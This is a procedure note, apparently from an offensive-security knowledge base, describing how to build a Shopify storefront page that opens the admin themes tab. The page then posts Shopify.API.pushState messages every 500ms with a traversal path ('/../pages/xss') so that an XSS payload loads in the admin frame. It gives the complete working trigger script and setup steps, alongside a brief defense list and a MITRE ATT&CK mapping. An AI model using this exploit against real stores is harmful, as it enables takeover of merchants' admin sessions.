---
id: proc-002
tags:
  - path-traversal
  - trigger
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/attack-trigger-pushstate]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:18.434Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Attack-Trigger-Page

## Summary

This procedure sets up a Shopify page that opens an admin tab and repeatedly sends postMessage to trigger path traversal via Shopify.API.pushState, loading the XSS payload into the admin frame.

## Description

The trigger page at '/pages/xss-play' uses JavaScript to open /admin/themes in a new window and post a JSON message every 500ms until success, exploiting the lack of pathname validation. This allows storefront-to-admin communication for the attack.

## Requirements

1. Existing XSS payload page
2. Shopify page creation access
3. Target admin route (e.g., /admin/themes)

## Defense

- Validate postMessage origins and data in admin scripts
- Disable or sandbox cross-frame messaging
- Log and alert on unexpected route pushes

## Objectives

1. Initiate cross-context communication from storefront
2. Traverse path to load XSS in admin
3. Automate retries for reliable trigger

## Instructions

### Step 1: Create Trigger Page

**Context**: In Shopify admin, create page 'xss play' at '/pages/xss-play'.

**Command** ([[commands/attack-trigger-pushstate]]):
```html
<script>function attack(){const ctx = window.open(location.origin+'/admin/themes','_blank')const data =JSON.stringify({message:'Shopify.API.pushState',data:{pathname:"/../pages/xss"}});let interval; interval =setInterval(function(){if(window.attackSuccess){clearInterval(interval)}else{ ctx.postMessage(data)}},500)}attack()</script><a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```

> Inject this into page content and save. Expected output: Page ready with clickable attack button.

### Step 2: Verify Script

**Context**: Test the page loads the script.

**Instructions**: Visit the page; inspect console for errors.

> Script should be present; no execution until clicked.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/attack-trigger-pushstate]]

## Tools Used


## Tags

- path-traversal
- trigger
